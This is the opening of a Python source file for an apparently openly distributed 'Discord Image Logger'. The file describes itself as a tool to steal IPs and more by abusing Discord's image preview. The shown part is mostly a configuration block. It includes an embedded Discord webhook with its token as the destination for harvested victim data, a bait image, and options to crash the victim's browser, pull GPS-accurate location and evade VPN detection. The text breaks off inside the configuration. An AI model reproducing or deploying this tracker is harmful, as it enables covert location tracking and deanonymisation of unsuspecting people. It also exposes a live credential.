# Discord Image Logger
# By Pxngs | https://github.com/Pxngs

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1408328412258500679/zv6WQKDK1YQAyQf6QWAtlGsdxFvHPjFlwkh1m8vr-lHuDp1abFZyJfZ2XNDG5TUwBxlz",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPL0ujPfmYGdvMzY8YfCxnrzAJ8Nrb4Frw0D60L_YnCTHHxQbOmxp2EXI&s", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Pxngs's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
